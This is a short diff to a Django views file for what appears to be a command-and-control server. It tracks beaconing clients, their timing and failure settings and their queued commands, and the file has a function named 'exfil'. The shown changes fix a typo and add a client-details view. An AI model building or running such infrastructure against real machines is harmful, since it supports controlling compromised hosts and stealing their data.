@@ -9,6 +9,7 @@ import time
 import os
 import base64
 import time
+from datetime import datetime, timezone
 
 def clientTest(request):
     return HttpResponse(request.META['REMOTE_ADDR'])
@@ -49,7 +50,7 @@ def update(request):
     current_client.ip = request.META['REMOTE_ADDR']
     current_client.lowTime = request.POST["LOW_TIME"]
     current_client.highTime = request.POST["HIGH_TIME"]
-    current_client.maxFailts = request.POST["MAX_FAILS"]
+    current_client.maxFails = request.POST["MAX_FAILS"]
     current_client.save()
     return HttpResponse()
 
@@ -71,5 +72,10 @@ def exfil(request):
 
 def clientTable(request):
     queryset = client.objects.all()
-    table = ClientTable(queryset)
-    return render(request, 'clientTable.html', {'table': table})
+    return render(request, 'clientTable.html', {'client_list':queryset})
+
+def details(request,uuid):
+    curClient = client.objects.get(uuid=uuid)
+    lastBeacon = datetime.fromtimestamp(curClient.lastBeacon).strftime('%Y-%m-%d %H:%M:%S')
+    commands = curClient.commands.all()
+    return render(request,'details.html', {'client':curClient, 'lastBeacon':lastBeacon,'commands':commands})
